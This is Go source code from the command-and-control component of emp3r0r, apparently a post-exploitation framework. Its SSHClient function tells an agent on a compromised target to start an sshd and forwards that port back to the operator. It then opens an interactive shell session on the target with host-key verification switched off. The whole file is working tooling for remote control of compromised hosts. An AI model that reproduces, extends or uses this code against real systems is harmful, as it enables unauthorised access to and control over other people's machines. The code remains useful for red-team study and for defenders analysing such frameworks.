package cc

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SSHClient ssh to sshd server, with shell access in a new tmux window
func SSHClient(shell, port string) (err error) {
	if !util.IsCommandExist("ssh") {
		err = fmt.Errorf("ssh must be installed")
		return
	}

	// is port mapping already done?
	lport := strconv.Itoa(util.RandInt(2048, 65535))
	to := "127.0.0.1:" + port
	exists := false
	for _, p := range PortFwds {
		if p.Agent == CurrentTarget && p.To == to {
			exists = true
			lport = p.Lport // use the correct port
			break
		}
	}

	if !exists {
		// start sshd server on target
		cmd := fmt.Sprintf("!sshd %s %s %s", shell, port, uuid.NewString())
		if shell != "bash" {
			err = SendCmdToCurrentTarget(cmd)
			if err != nil {
				return
			}
			CliPrintInfo("Starting sshd (%s) on target %s", shell, strconv.Quote(CurrentTarget.Tag))

			// wait until sshd is up
			defer func() {
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd)
				CmdResultsMutex.Unlock()
			}()
			for {
				time.Sleep(100 * time.Millisecond)
				res, exists := CmdResults[cmd]
				if exists {
					if strings.Contains(res, "success") {
						break
					} else {
						err = fmt.Errorf("Start sshd failed: %s", res)
						return
					}
				}
			}
		}

		// set up port mapping for the ssh session
		CliPrintInfo("Setting up port mapping for sshd")
		pf := &PortFwdSession{}
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		go func() {
			err = pf.RunPortFwd()
			if err != nil {
				err = fmt.Errorf("PortFwd failed: %v", err)
				CliPrintError("Start port mapping for sshd: %v", err)
			}
		}()
		CliPrintInfo("Waiting for response from %s", CurrentTarget.Tag)
		if err != nil {
			return
		}
	}

	// wait until the port mapping is ready
	exists = false
wait:
	for i := 0; i < 100; i++ {
		if exists {
			break
		}
		time.Sleep(100 * time.Millisecond)
		for _, p := range PortFwds {
			if p.Agent == CurrentTarget && p.To == to {
				exists = true
				break wait
			}
		}
	}
	if !exists {
		err = errors.New("Port mapping unsuccessful")
		return
	}

	// let's do the ssh
	sshPath, err := exec.LookPath("ssh")
	if err != nil {
		CliPrintError("ssh not found, please install it first: %v", err)
	}
	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
		sshPath, lport)
	CliPrintSuccess("Opening SSH session for %s in new window. "+
		"If that fails, please execute command %s manaully",
		CurrentTarget.Tag, strconv.Quote(sshCmd))

	// agent name
	name := CurrentTarget.Hostname
	label := Targets[CurrentTarget].Label
	if label != "nolabel" && label != "-" {
		name = label
	}
	return TmuxNewWindow(fmt.Sprintf("%s-%s", name, shell), sshCmd)
}
